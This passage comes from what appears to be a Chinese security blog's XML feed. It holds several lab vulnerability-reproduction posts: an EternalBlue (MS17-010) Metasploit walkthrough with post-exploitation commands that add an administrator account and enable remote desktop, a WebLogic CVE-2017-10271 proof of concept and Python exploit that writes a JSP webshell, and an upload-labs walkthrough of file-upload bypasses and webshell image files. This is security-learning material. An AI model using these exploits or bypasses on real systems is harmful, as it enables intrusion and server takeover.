src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145507.png" alt></p><p><strong>靶机:</strong></p><p>使用靶机访问<code>192.168.159.136/index.html</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150229.png" alt></p><p>成功反弹session<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145952.png" alt></p><p><code>sessions -l</code><br>显示会话列表</p><p><code>sessions id</code><br>选择指定id会话<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150006.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/197760.html" target="_blank" rel="noopener">CVE-2018-15982任意代码执行漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2018-15982 </tag>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞(ms17-010)复现</title>
      <link href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/"/>
      <url>/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，无需用户进行任何操作，就可以中招。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>目前已知受影响的Windows 版本包括但不限于：<br>WindowsNT<br>Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8<br>Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 SP0</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali 2.0<br>靶机：Windows 7 X64 （192.168.159.133）</p><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><p>两种方法</p><h3 id="一、使用nmap扫描"><a href="#一、使用nmap扫描" class="headerlink" title="一、使用nmap扫描"></a>一、使用nmap扫描</h3><p><code>nmap -r 192.168.159.0/24C</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807171738.png" alt></p><h3 id="二、使用msf扫描模块"><a href="#二、使用msf扫描模块" class="headerlink" title="二、使用msf扫描模块"></a>二、使用msf扫描模块</h3><p> kali 执行 <code>msfconsole</code> 进入MSF框架</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172414.png" alt></p><p>搜索ms17_010<br><code>search ms17_010</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172807.png" alt></p><p>使用ms17-010扫描模块，对靶机Win7进行扫描<br>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>执行<br><code>run</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173247.png" alt></p><h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><p>使用模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p>设置目标ip<br><code>set RHOSTS 192.168.159.133</code></p><p>查看选项<br><code>shwo options</code></p><p>执行<br><code>exploit</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807173713.png" alt></p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807174031.png" alt></p><h2 id="控制提权"><a href="#控制提权" class="headerlink" title="控制提权"></a>控制提权</h2><p>windows shell 下执行：<br>新建用户<br><code>net user dylan 123456 /add</code></p><p>添加管理组<br><code>net localgroup administrators dylan /add</code></p><p>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p>kali 登陆远程桌面：<br><code>rdesktop 192.168.159.133:3389</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807175105.png" alt></p><hr><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><ul><li>在线更新：开启Windows Update更新。</li><li>打补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener">点击下载</a></li></ul><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/193681.html" target="_blank" rel="noopener">永恒之蓝漏洞复现(ms17-010)</a><br><a href="https://blog.51cto.com/chenxinjie/2092754?from=timeline" target="_blank" rel="noopener">MS17-010 基于”永恒之蓝”实现Windows Getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 永恒之蓝漏洞 </tag>
            
            <tag> ms17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic WLS组件漏洞复现</title>
      <link href="/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/"/>
      <url>/2019/08/06/weblogic-wls-zu-jian-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>漏洞编号：CVE-2017-10271</p><p>漏洞描述：<br>Weblogic的WLS Security组件对外提供webservice服务，<br>其中使用了XMLDecoder来解析用户传入的XML数据，<br>在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>受影响WebLogic版本：</p><ul><li>10.3.6.0.0</li><li>12.1.3.0.0</li><li>12.2.1.1.0</li><li>12.2.1.2.0</li></ul><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10 1903 x64<br>靶   机：Windows server 2008 R2 x64</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>安装<code>jdk1.8.0_191</code>（路径不要带有空格）,并配置环境变量<br>安装 <a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html" target="_blank" rel="noopener">WebLogic Server 10.3.6</a><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806171919.png" alt><br>详细安装过程参考：<a href="https://wenku.baidu.com/view/938a7a56f5335a8102d220d0.html" target="_blank" rel="noopener">webLogic10.3.6安装、配置图解</a></p><p>输入配置管理员用户名和口令时设置的用户名和口令之后，<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172423.png" alt></p><p>使用攻击机访问  <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>如出现如下界面，则搭建成功<br><strong>（注意：要把靶机上的防火墙关闭）</strong><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806172734.png" alt></p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>&lt;soapenv:Envelope     xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;    &lt;soapenv:Header&gt;       &lt;work:WorkContext    xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;           &lt;java      version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;               &lt;void     class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array    class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void     index=&quot;0&quot;&gt;                           &lt;string&gt;calc&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;1&quot;&gt;                            &lt;string&gt;&lt;/string&gt;                        &lt;/void&gt;                        &lt;void     index=&quot;2&quot;&gt;                            &lt;string&gt; &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void     method=&quot;start&quot;/&gt;&lt;/void&gt;           &lt;/java&gt;       &lt;/work:WorkContext&gt;   &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;    &lt;/soapenv:Envelope&gt;</code></pre><p>攻击机访问 <code>http://靶机ip:7001/wls-wsat/CoordinatorPortType</code><br>使用Burp Suite抓包，发送到Repeater<br>使用post方法发送下方POC，并添加Content-Type:text/xml，把Cache-Control修改为no-cache<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173735.png" alt></p><p>返回状态码 500，进入靶机查看，弹出计算机，执行calc命令成功</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806173856.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806174012.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#! -*- coding:utf-8 -*-import requestsurl = &quot;http://192.168.159.138:7001/wls-wsat/CoordinatorPortType&quot;xml = &#39;&#39;&#39;     &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;     &lt;![CDATA[ &lt;% out.print(&quot;test&quot;); %&gt;     ]]&gt;     &lt;/string&gt;     &lt;/void&gt;     &lt;void method=&quot;close&quot;/&gt;     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;     &lt;/work:WorkContext&gt;     &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;&#39;&#39;&#39;r =requests.post(url,headers={&#39;Content-Type&#39;:&#39;text/xml&#39;,&#39;Cache-Control&#39;:&#39;no-cache&#39;},data=xml)print r.status_codeprint r.text</code></pre><p>(记得修改python文件里面的ip地址)<br>直接运行 <code>python2 CVE-2017-10271.py</code> 写入一句话</p><p>访问shell<br><code>http://靶机ip:7001/bea_wls_internal/test.jsp</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190806190652.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/158247.html" target="_blank" rel="noopener">WebLogic WLS组件漏洞复现</a><br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WebLogic WLS </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传漏洞练习</title>
      <link href="/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/"/>
      <url>/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>最近在研究文件上传漏洞，找到一个很好的靶场——<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>，<br>一个想帮你总结所有类型的上传漏洞的靶场 ，可以用docker快速搭建，闯关的过程中遇到很多问题，受益匪浅。</p><hr><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>使用docker快速搭建，docker的安装这里不再赘述。</p><p><code>docker pull c0ny1/upload-labs</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804145816.png" alt></p><p>创建容器<br><code>docker run -d -p 8000:80 c0ny1/upload-labs:latest</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150235.png" alt></p><p>本地环境，访问<code>127.0.0.1:8000</code><br>云服务器上搭建的，访问<code>服务器ip:8000</code>（注意开放防火墙端口，阿里云服务器需要在云控制台配置开放端口）</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804150626.png" alt></p><hr><h1 id="0x03-闯关"><a href="#0x03-闯关" class="headerlink" title="0x03 闯关"></a>0x03 闯关</h1><h2 id="Pass-01（前端）"><a href="#Pass-01（前端）" class="headerlink" title="Pass-01（前端）"></a>Pass-01（前端）</h2><p>这一关是在客户端使用js对不合法图片进行检查，直接F12，把调用相关js的代码删掉，直接上传拿shell</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151107.png" alt></p><h2 id="Pass-02（MIME）"><a href="#Pass-02（MIME）" class="headerlink" title="Pass-02（MIME）"></a>Pass-02（MIME）</h2><p>第二关主要是检查MIME，直接抓包修改Content-Type（例如：<code>image/gif</code>）上传即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804151431.png" alt></p><h2 id="Pass-03（特殊可解析后缀）"><a href="#Pass-03（特殊可解析后缀）" class="headerlink" title="Pass-03（特殊可解析后缀）"></a>Pass-03（特殊可解析后缀）</h2><p>第三关是黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件，尝试另类文件名绕过。（phtml，php3，php4, php5, pht等）<br>直接抓包修改文件后缀，将php改为phtml，php3，php4, php5, pht等，上传成功<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804152622.png" alt></p><p>但是很鸡肋，如果服务器没有配置别名解析，上传上去是无法被解析执行的。<br>如果无法解析执行，需要修改apache配置文件。<br>这里以docker搭建的环境为例：<br>输入命令进入容器内部：</p><pre><code>docker exec -it condescending_nightingale /bin/bash # 这里的condescending_nightingale是容器的name，可以输入docker ps查看</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804153104.png" alt></p><pre><code>vim /etc/apache2/apache2.conf</code></pre><p>修改apache2配置文件，添加下面这句话<br><code>AddType application/x-httpd-php .php .phtml .phps .php3 .php5 .pht</code></p><p>退出容器内部<br><code>exit</code></p><p>重启容器，即可解析成功<br><code>docker restart condescending_nightingale</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804154224.png" alt></p><h2 id="Pass-04（htaccess）"><a href="#Pass-04（htaccess）" class="headerlink" title="Pass-04（htaccess）"></a>Pass-04（htaccess）</h2><p>这一关过滤了各种罕见后缀，但是没有过滤<code>.htaccess</code>文件<br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>启用.htaccess，需要修改<code>apache2.conf</code><strong>(同Pass-03)</strong>，启用AllowOverride.</p><p><code>AllowOverride None</code><br>改为<br><code>AllowOverride All</code></p><p>如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。<br>例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：</p><p><code>AccessFileName .config</code> </p><p>然后执行命令启用Mod_rewrite模块</p><p><code>sudo a2enmod rewrite</code></p><p>最后重启apache2</p><p><code>service apache2 restart</code></p><p>使用 快捷键<code>ctrl + p + q</code>退出容器（不会中止容器）</p><p>先上传<code>.htaccess</code>文件，文件内容如下(引号内替换成你要上传执行的文件名)：</p><pre><code>    &lt;FilesMatch &quot;cmd.jpeg&quot;&gt;      SetHandler application/x-httpd-php    &lt;/FilesMatch&gt;</code></pre><p>windows系统文件不能命名为<code>.*</code>，所以在上传的时候抓包，改文件名，删掉点前面的</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804215949.png" alt></p><p>然后上传图片木马文件  <code>cmd.jpeg</code> ，成功解析。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190804220610.png" alt></p><h2 id="Pass-05（大小写）"><a href="#Pass-05（大小写）" class="headerlink" title="Pass-05（大小写）"></a>Pass-05（大小写）</h2><p>这一关把<code>.htaccess</code>后缀也禁止了，查看源代码，发现把转换成小写的代码去掉了</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>因此我们可以上传Php、phP之类的来绕过黑名单后缀，成功上传。<br>(在Linux没有特殊配置的情况下，这种情况只有win可以解析执行，因为win会忽略大小写)</p><h2 id="Pass-06（空格）"><a href="#Pass-06（空格）" class="headerlink" title="Pass-06（空格）"></a>Pass-06（空格）</h2><p>这一关，少了这一段代码<br><code>$file_ext = trim($file_ext); //首尾去空</code></p><p>可以进行空格绕过，直接抓包修改文件名，再文件名末尾添加空格，成功上传</p><h2 id="Pass-07（点）"><a href="#Pass-07（点）" class="headerlink" title="Pass-07（点）"></a>Pass-07（点）</h2><p>这一关少了这段代码</p><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p><h2 id="Pass-08（-DATA）"><a href="#Pass-08（-DATA）" class="headerlink" title="Pass-08（::$DATA）"></a>Pass-08（::$DATA）</h2><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code><br>NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。<br>备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传.php::$DATA绕过。(仅限windows)</p><h2 id="Pass-09-代码审计"><a href="#Pass-09-代码审计" class="headerlink" title="Pass-09(代码审计)"></a>Pass-09(代码审计)</h2><pre><code>        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</code></pre><p>查看源码，这里只过滤了一次，所以直接构造 <code>.php. .</code> 绕过</p><h2 id="Pass-10-双写"><a href="#Pass-10-双写" class="headerlink" title="Pass-10(双写)"></a>Pass-10(双写)</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>这里是将黑名单里的后缀替换为空，可以利用双写绕过<br>构造<code>.pphpph</code>,成功上传解析执行。</p><h2 id="Pass-11（-00截断）"><a href="#Pass-11（-00截断）" class="headerlink" title="Pass-11（%00截断）"></a>Pass-11（%00截断）</h2><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>可以参考这篇文章：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p><p><code>save_path</code> 是一个可控的变量，可以使用%00截断<br>使用条件：</p><ul><li>php 版本&lt;5.3.4 才有可能存在此漏洞</li><li>php的magic_quotes_gpc为OFF状态</li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805093837.png" alt></p><h2 id="Pass-12（0x00截断）"><a href="#Pass-12（0x00截断）" class="headerlink" title="Pass-12（0x00截断）"></a>Pass-12（0x00截断）</h2><p>原理同Pass-11,只不过<code>save_path</code>是通过post传进来的，需要在Hex里修改</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100157.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805095929.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805100023.png" alt></p><p><code>+</code>的URL编码的16进制 为2b，将2b改为00即可</p><h2 id="Pass-13（文件头）"><a href="#Pass-13（文件头）" class="headerlink" title="Pass-13（文件头）"></a>Pass-13（文件头）</h2><p>这一关通过读文件的前2个字节判断文件类型<br>直接使用 cmd命令生成图片木马上传</p><p><code>copy pikachu.gif /b + cmd.php /a cmd.gif</code></p><p>用给出的文件包含漏洞页面来测试图片马是否能正常运行！<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103257.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805103451.png" alt></p><h2 id="Pass-14（getimagesize）"><a href="#Pass-14（getimagesize）" class="headerlink" title="Pass-14（getimagesize）"></a>Pass-14（getimagesize）</h2><p>这一关使用<code>getimagesize</code>获取文件类型，直接就可以利用图片马进行绕过。（同Pass-13）</p><h2 id="Pass-15（exif-imagetype-）"><a href="#Pass-15（exif-imagetype-）" class="headerlink" title="Pass-15（exif_imagetype()）"></a>Pass-15（exif_imagetype()）</h2><p>本关使用<code>exif_imagetype()</code>检查是否为图片文件,直接就可以利用图片马就可进行绕过。</p><h2 id="Pass-16（二次渲染）"><a href="#Pass-16（二次渲染）" class="headerlink" title="Pass-16（二次渲染）"></a>Pass-16（二次渲染）</h2><p>本关判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染<br>具体可以参考这篇文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p><p>先上传图片码，然后下载下来，用16进制编辑器打开，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，<br>将Webshell代码插在该部分，然后上传即可<br>jpg和png很麻烦，gif直接修改没有改变的区域即可。</p><h2 id="Pass-17（条件竞争）"><a href="#Pass-17（条件竞争）" class="headerlink" title="Pass-17（条件竞争）"></a>Pass-17（条件竞争）</h2><p>本关文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除。<br>此时可以利用条件竞争在保存文件后删除文件前来执行php文件。<br>可以用burp suite中的Intruder模块同时批量上传、访问webshell，<br>将payloads中的payload type设置为Null payload，<br>Generate payload次数多点。</p><h2 id="Pass-18（条件竞争）"><a href="#Pass-18（条件竞争）" class="headerlink" title="Pass-18（条件竞争）"></a>Pass-18（条件竞争）</h2><p>和Pass-17一样，也是一个条件竞争的问题，查看源代码<br>对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名等。<br>可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p><h2 id="Pass-19（代码审计）"><a href="#Pass-19（代码审计）" class="headerlink" title="Pass-19（代码审计）"></a>Pass-19（代码审计）</h2><pre><code>$img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) {                 $is_upload = true;            }else{                $msg = &#39;上传失败！&#39;;            }</code></pre><p><code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，因此可以在<code>save_name</code>利用00截断绕过。</p><p>另外<strong><code>move_uploaded_file</code></strong>会忽略掉文件末尾的 <code>/.</code><br>所以可以构造 <code>cmd.php/.</code> 来绕过<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805121815.png" alt></p><h2 id="Pass-20（代码审计）"><a href="#Pass-20（代码审计）" class="headerlink" title="Pass-20（代码审计）"></a>Pass-20（代码审计）</h2><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><pre><code>if (!is_array($file)) {                    $file = explode(&#39;.&#39;, strtolower($file));                }</code></pre><pre><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></pre><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，<br>第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，<br>根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将/.忽略，因此还是可以上传成功的。<br>因此<code>save_name</code>变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805123452.png" alt></p><hr><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><h2 id="upload-labs总结"><a href="#upload-labs总结" class="headerlink" title="upload-labs总结"></a>upload-labs总结</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134449.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134922.png" alt></p><p>其中有一些漏洞因为环境原因，没能成功解析执行。<br>顺便在总结一下其他中间件问题导致的解析漏洞</p><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><p>IIS 6.0解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><pre><code>/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx</code></pre><h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php，可以解析为php</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4029" target="_blank" rel="noopener">Upload-labs 20关通关笔记</a><br><a href="https://blog.csdn.net/u011377996/article/details/86776198" target="_blank" rel="noopener">upload-labs刷关记录</a><br><a href="http://poetichacker.com/writeup/从upload-labs总结上传漏洞及其绕过.html" target="_blank" rel="noopener">从upload-labs总结上传漏洞及其绕过 </a><br><a href="https://www.smi1e.top/文件解析漏洞总结/" target="_blank" rel="noopener">文件解析漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
